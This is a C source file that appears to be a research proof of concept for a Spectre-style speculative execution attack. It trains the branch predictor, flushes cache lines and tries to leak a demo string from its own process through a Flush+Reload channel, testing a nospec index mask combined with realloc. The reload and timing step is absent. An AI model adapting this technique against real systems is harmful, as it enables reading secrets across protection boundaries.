#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include "./lib/nospec.h"
#include <string.h>
#include <stdbool.h>
#include "./lib/inline_asm.h"
#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <errno.h>
#include <sys/resource.h>
#include "mimalloc-main/include/mimalloc.h"

#define PAGE_SIZE 4096
#define NUM_PAGES 256

static inline unsigned long
array_index_mask_nospec(unsigned long index, unsigned long size) {
    unsigned long mask;

    asm volatile("cmp %1,%2; sbb %0,%0;"
                 : "=r"(mask)
                 : "g"(size), "r"(index)
                 : "cc");
    return mask;
}


volatile uint32_t array_size = 8;


char* secret_init(){
    char* array = malloc(32);
    if (array == NULL) {
        perror("Initial malloc failed");
        return NULL;
    }
    strcpy(array, "The cake is a lie!");
    return array;
}

uint8_t* array_init(){
    uint8_t* array = malloc(array_size);
    if (array == NULL) {
        perror("Initial malloc failed");
        return NULL;
    }
    memset(array, '-', array_size);
    // printf("Array addr: %p\n", array);
    return array;
}


char prev_char = 'A';
char random_char(){
    prev_char =(char)((prev_char+1) % 93);
    return prev_char;
}




#define REP 1 // Number of repetitions to de-noise the channel
#define TRAINING_EPOCH 4 // 15 in-bound accesses then 1 out-of-bound access
#define BUF_SIZE 1


#define CACHE_LINE_SIZE 64
#define SYMBOL_CNT (1 << (sizeof(char) * 8))

size_t csel(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
    return (T & mask) | (F & ~mask);
    // return F ^ ((T ^ F) & mask);  // This also works and should be a bit faster
}

void flush_lines(void *start, size_t stride, size_t N) {
    for (size_t c = 0; c < N; c++) {
        _mm_clflush(start + stride * c);
    }
}


// ====== The evil attacker code ======

uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
    if (new_size <= array_size && new_size >= (array_size / 2) && new_size > 0) {
        *array = realloc(*array, new_size);
    }

    // *array = realloc(*array, new_size);

    index &= array_index_mask_nospec(index, new_size);
    uint8_t secret = (*array)[index];
    _maccess(page + secret * stride);
    return NULL;
}


void attacker_function() {
    printf("Version 1.4\n");
    // Create read-only shared pages for Flush+Reload
    // SYMBOL_CNT=256
    uint8_t *array = array_init();
    char *secret = secret_init();
    // printf("Offset: %#lx\n", (uintptr_t)secret - (uintptr_t)array);

    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return;
    }
    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);


    printf("-----------------------------------------\n");
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[BUF_SIZE] = { '\0' };

    uint8_t* array_base = &array[0]; // Base address
    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
    printf("Secret address: %p, Array address: %p\n", secret, array_base);
    printf("The malicious index is %p-%p=%#lx\n", secret, array_base,
           malicious_index);
    printf("-----------------------------------------\n");

    size_t safe_size = array_size-1; //New size but not too small to actually want to resize
    size_t safe_index = array_size/2; //An in-bound index
    size_t malicious_size = (size_t)(malicious_index+1);


    for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
        for (size_t r = 0; r < REP; r++) {
            array_base = &array[0]; // Base address
            malicious_index = (uintptr_t)secret - (uintptr_t)array_base + (uintptr_t)c;
            safe_size = array_size-1; //New size but not too small to actually want to resize
            safe_index = array_size/2; //An in-bound index
            malicious_size = (size_t)(malicious_index+1);
            for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                // We use an in-bound index for the first TRAINING_EPOCH - 1
                // iterations and switch to the malicious index
                // for the last iteration
                bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
                size_t size = csel(malicious_size, safe_size, is_attack);
                size_t index = csel(malicious_index, safe_index, is_attack);


                // The "Flush" part of Flush+Reload
                // Can be replaced with Prime+Probe
                // startIndex, stride, N
                flush_lines(pages, PAGE_SIZE, SYMBOL_CNT);
                _mm_clflush((void *)&array_size);
                // Ensure clflushes are finished
                _mm_mfence();
                _mm_lfence();
                // Call the victim function and prevent compiler optimizations
                _no_opt(victim_function(&array, pages, index, PAGE_SIZE, size));
            }
            free(array);
            array = array_init();
        }
    }
    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
    free(array);
    free(secret);
    return;
}


int main (){
    attacker_function();
    return 0;
}
